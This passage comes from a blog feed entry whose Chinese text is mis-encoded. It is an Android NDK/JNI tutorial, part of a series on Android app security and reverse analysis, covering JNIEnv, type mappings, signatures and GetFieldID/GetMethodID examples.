&lt;p>â€‹ è¿™ç« å°±æ˜¯ä¸€äº›ä¼šç”¨åˆ°çš„å‘½ä»¤ï¼Œåé¢çš„å­¦ä¹ å¿…ä¸å¯å°‘çš„çŸ¥è¯†ç‚¹ã€‚&lt;/p></description></item><item><title>Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡2</title><link>https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%872/</link><pubDate>Thu, 16 Aug 2018 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%872/</guid><description>&lt;h1 id="androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡2">Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡2&lt;/h1>
&lt;h1 id="ä¸€-åŸºç¡€ç¯‡">ä¸€ã€ åŸºç¡€ç¯‡â‘¡&lt;/h1>
&lt;h2 id="ç¬¬äºŒç« -androidä¸­ndkçš„å¼€å‘">ç¬¬äºŒç«  Androidä¸­NDKçš„å¼€å‘&lt;/h2>
&lt;h3 id="1-ç›¸å…³ç¯å¢ƒ">1. ç›¸å…³ç¯å¢ƒ&lt;/h3>
&lt;p>ç›¸å…³ç¯å¢ƒå‚è€ƒå¦å¤–ä¸€ç¯‡æ–‡ç« &lt;a class="link" href="https://naivete.cc/post/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener"
>Androidå®‰å…¨å’Œå¼€å‘ç¯å¢ƒæ­å»º&lt;/a>&lt;/p>
&lt;h3 id="2-jniåŸºç¡€">2. JNIåŸºç¡€&lt;/h3>
&lt;h3 id="21-ç¬¬ä¸€è¡Œä»£ç ä¹¦ä¸Šä½¿ç”¨eclipseæˆ‘ä½¿ç”¨asç®€å•æ–¹ä¾¿å¾ˆå¤š">2.1 ç¬¬ä¸€è¡Œä»£ç (ä¹¦ä¸Šä½¿ç”¨Eclipse,æˆ‘ä½¿ç”¨AS(ç®€å•æ–¹ä¾¿å¾ˆå¤š))&lt;/h3>
&lt;p>â€‹ å‚è€ƒæ–‡ç« &lt;a class="link" href="https://naivete.cc/post/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener"
>Androidå®‰å…¨å’Œå¼€å‘ç¯å¢ƒæ­å»º&lt;/a>ä¸­çš„JNIå¼€å‘ç« èŠ‚&lt;/p>
&lt;h3 id="22-jnienvç±»å‹å’Œjobjectç±»å‹">2.2 JNIEnvç±»å‹å’Œjobjectç±»å‹&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>AS é»˜è®¤è‡ªåŠ¨ç”Ÿæˆ&lt;/strong>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">native&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">stringFromJNI&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">Java_com_naivete_jni_1study_MainActivity_stringFromJNI&lt;/span>&lt;span class="o">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">JNIEnv&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jobject&lt;/span> &lt;span class="cm">/* this */&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">hello&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;Hello from C++&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">NewStringUTF&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">hello&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">c_str&lt;/span>&lt;span class="o">());&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>
&lt;p>&lt;strong>JNIEnvç±»å‹&lt;/strong>&lt;/p>
&lt;p>é€šè¿‡JNIEnv* æŒ‡é’ˆå°±å¯ä»¥å¯¹Javaç«¯çš„ä»£ç è¿›è¡Œæ“ä½œ&lt;/p>
&lt;p>Jniçš„æ‰€æœ‰å‡½æ•°å¯ä»¥æŸ¥çœ‹jni.hæ–‡ä»¶&lt;/p>
&lt;p>ä¸‹é¢æ˜¯ä¸€äº›å‡½æ•°egï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>NewObject : åˆ›å»ºJavaç±»ä¸­çš„å¯¹è±¡ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>NewString : åˆ›å»ºJavaç±»ä¸­çš„Stringå¯¹è±¡ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>NewArray : åˆ›å»ºç±»å‹ä¸ºTypeçš„æ•°ç»„å¯¹è±¡&lt;/p>
&lt;/li>
&lt;li>
&lt;p>GetField: è·å–å‹ä¸ºTypeçš„å­—æ®µã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>SetFileld: è®¾ç½®ç±»å‹ä¸ºTypeçš„å­—æ®µçš„å€¼ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>GetStaticField: è·å–ç±»å‹ä¸ºTypeçš„staticçš„å­—æ®µã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>SetStaticField:è®¾ç½®ç±»å‹ä¸ºTypedeçš„staticçš„å­—æ®µçš„å€¼ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>CallMethod: è°ƒç”¨è¿”å›ç±»å‹ä¸ºTypeçš„æ–¹æ³•ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>CallStaticMethod: è°ƒç”¨è¿”å›å€¼ç±»å‹ä¸ºTypeçš„Staticæ–¹æ³•&lt;/p>
&lt;p>â€¦..&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Jobjectå‚æ•°obj&lt;/strong>&lt;/p>
&lt;p>å¦‚æœnative æ–¹æ³•ä¸æ˜¯static ,objå°±ä»£è¡¨nativeæ–¹æ³•çš„å®ä¾‹ã€‚&lt;/p>
&lt;p>å¦‚æœnariveæ–¹æ³•æ˜¯static,obj å°±ä»£è¡¨nativeæ–¹æ³•çš„ç±»çš„classå¯¹è±¡å®ä¾‹ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Javaå’ŒC++ä¸­çš„åŸºæœ¬ç±»å‹çš„æ˜ å°„å…³ç³»&lt;/strong>ï¼š&lt;/p>
&lt;p>å…·ä½“æŸ¥çœ‹jni.hæ–‡ä»¶çš„è¯¦ç»†è¯´æ˜&lt;/p>
&lt;/li>
&lt;/ul>
&lt;table>
&lt;tr>
&lt;th>Javaç±»å‹&lt;/th>
&lt;th>æœ¬åœ°ç±»å‹&lt;/th>
&lt;th>JNIå®šä¹‰çš„åˆ«å&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>int&lt;/th>
&lt;th>long&lt;/th>
&lt;th>jint/jsize&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>long&lt;/th>
&lt;th>_int64&lt;/th>
&lt;th>jlong&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>byte&lt;/th>
&lt;th>signed char&lt;/th>
&lt;th>jbyte&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>boolean&lt;/th>
&lt;th>unsigned char&lt;/th>
&lt;th>jboolean&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>char&lt;/th>
&lt;th>unsigned short&lt;/th>
&lt;th>jchar&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>short&lt;/th>
&lt;th>short&lt;/th>
&lt;th>jshort&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>float&lt;/th>
&lt;th>float&lt;/th>
&lt;th>jfloat&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>double&lt;/th>
&lt;th>double&lt;/th>
&lt;th>jdouble&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>Object&lt;/th>
&lt;th>_jobject*&lt;/th>
&lt;th>jobject&lt;/th>
&lt;/tr>&lt;/table>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>jclassç±»å‹&lt;/strong>&lt;/p>
&lt;p>jclass è¡¨ç¤ºjavaä¸­çš„class ç±»ï¼š&lt;/p>
&lt;p>JNIEnv ç±»ä¸­æœ‰å¦‚ä¸‹å‡ ä¸ªç®€å•çš„å‡½æ•°å¯ä»¥å–å¾—jclass:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>jclass FindClass( const char* clsName):é€šè¿‡ç±»çš„åç§°æ¥è·å–jclass&lt;/p>
&lt;/li>
&lt;li>
&lt;p>jcalss GetObjectClass( jobject obj ):é€šè¿‡å¯¹è±¡å®ä¾‹æ¥è·å–jcalss,ç›¸å½“äºjava ä¸­çš„getclassæ–¹æ³•&lt;/p>
&lt;/li>
&lt;li>
&lt;p>jclass GetSuperClass(jclass obj):é€šè¿‡jclass å¯ä»¥è·å–å…¶çˆ¶ç±»çš„jclasså¯¹è±¡ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>nativeä¸­è®¿é—®Javaå±‚ä»£ç &lt;/strong>&lt;/p>
&lt;p>å¸¸è§çš„åº”ç”¨å°±æ˜¯è·å–ç±»çš„å±æ€§å’Œè°ƒç”¨ç±»çš„æ–¹æ³•&lt;/p>
&lt;p>JNiåœ¨jni.hå¤´æ–‡ä»¶ä¸­å®šä¹‰äº†jfieldIdã€jmethodIDç±»å‹åˆ†åˆ«ä»£è¡¨JAVAç«¯çš„å±æ€§å’Œæ–¹æ³•ã€‚&lt;/p>
&lt;p>ä½¿ç”¨JNIçš„ä»¥ä¸‹æ–¹æ³•æ¥å–å¾—ç›¸åº”çš„jfieldIdã€jmethodIDï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>GetFieldIDã€GetMethodID&lt;/p>
&lt;/li>
&lt;li>
&lt;p>GetStaticFieldIDã€GetStaticMethodID&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>æŸ¥çœ‹jni.hä¸­æºå‡½æ•°&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl"> &lt;span class="n">GetFieldID&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">jclass&lt;/span> &lt;span class="n">clazz&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kd">const&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kd">const&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">sig&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>â€‹ å‚æ•°è¯´æ˜ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>clazz æ–¹æ³•ä¾èµ–çš„ç±»å¯¹è±¡çš„classå¯¹è±¡&lt;/p>
&lt;/li>
&lt;li>
&lt;p>name: å­—æ®µçš„åç§°&lt;/p>
&lt;/li>
&lt;li>
&lt;p>sig : å­—æ®µçš„ç­¾å&lt;/p>
&lt;p>æŸ¥çœ‹ç­¾åå‘½ä»¤&lt;/p>
&lt;p>&lt;code>javap -s -p å­—èŠ‚ç .class æ–‡ä»¶&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>GetMethodID ä¹Ÿèƒ½å¤Ÿä¼šçš„æ„é€ å‡½æ•°çš„jmethodIDï¼Œåˆ›å»ºä¸€ä¸ªJavaå¯¹è±¡æ˜¯å¯ä»¥è°ƒç”¨æŒ‡å®šçš„æ„é€ æ–¹æ³•ï¼Œegï¼š&lt;/p>
&lt;p>&lt;code>env-&amp;gt;GetmethodID(data_class,&amp;quot;&amp;lt;init&amp;gt;&amp;quot;,&amp;quot;()v&amp;quot;);&lt;/code>&lt;/p>
&lt;p>ç­¾åçš„æ ¼å¼ï¼š&lt;/p>
&lt;table>
&lt;tr>
&lt;th>ç±»å‹&lt;/th>
&lt;th>ç›¸åº”çš„ç­¾å&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>boolean&lt;/th>
&lt;th>Z&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>byte&lt;/th>
&lt;th>B&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>chat&lt;/th>
&lt;th>C&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>short&lt;/th>
&lt;th>S&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>int&lt;/th>
&lt;th>I&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>long&lt;/th>
&lt;th>L&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>float&lt;/th>
&lt;th>F&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>double&lt;/th>
&lt;th>D&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>void&lt;/th>
&lt;th>V&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>object&lt;/th>
&lt;th>Lç”¨/åˆ†å‰²åŒ…çš„å®Œæ•´ç±»åï¼›Ljava/lang/String;&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>Array&lt;/th>
&lt;th>[ç­¾å [I [Ljava/lang/Object&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>Method&lt;/th>
&lt;th>(å‚æ•°ç±»å‹ç­¾åÂ·Â·Â· .) è¿”å›å€¼ç±»å‹ç­¾å&lt;/th>
&lt;/tr>&lt;/table>
&lt;p>eg:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">package&lt;/span> &lt;span class="nn">com.naivete.jni_study&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">java.util.Date&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">Hello&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">property&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">function&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">foo&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Date&lt;/span> &lt;span class="n">date&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">arr&lt;/span>&lt;span class="o">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">println&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;function&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">native&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">test&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">extern&lt;/span> &lt;span class="s">&amp;#34;C&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">JNIEXPORT&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="n">JNICALL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">Java_com_naivete_jni_1study_Hello_test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">JNIEnv&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jobject&lt;/span> &lt;span class="n">instance&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// TODO
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">jclass&lt;/span> &lt;span class="n">helloclazz&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">GetObjectClass&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jfieldID&lt;/span> &lt;span class="n">field_prop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">GetFieldID&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">helloclazz&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;property&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;I&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//å–åˆ°propertyå­—æ®µ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">jmethodID&lt;/span> &lt;span class="n">method_fun&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">GetMethodID&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">helloclazz&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;function&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;ILjava/util/Date;[I)I&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//å–åˆ°functionå‡½æ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">CallIntMethod&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">method_fun&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0L&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>GetStaticFieldIDä¸GetStaticMethodIDè¿™ä¸¤ä¸ªæ–¹æ³•çš„ç”¨æ³•å¤§åŒå°å¼‚ã€‚&lt;/p>
&lt;h3 id="23-jnienvç±»å‹ä¸­æ–¹æ³•çš„ä½¿ç”¨">2.3 JNIEnvç±»å‹ä¸­æ–¹æ³•çš„ä½¿ç”¨&lt;/h3>
&lt;ul>
&lt;li>åœ¨javaä¸­å®šä¹‰ä¸€ä¸ªå±æ€§ï¼Œå†ä»C++ä»£ç ä¸­å°†å…¶è®¾ç½®æˆå¦å¤–çš„å€¼&lt;/li>
&lt;/ul>
&lt;h3 id="231-nativeä¸­è·å–æ–¹æ³•çš„id">2.3.1 nativeä¸­è·å–æ–¹æ³•çš„ID&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">TAG&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">number&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">native&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">sayHello&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Hello&lt;/span> &lt;span class="n">hello&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Hello&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hello&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">sayHello&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">print&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">hello&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">number&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">d&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">TAG&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">hello&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">number&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">JNIEXPORT&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="n">JNICALL&lt;/span>
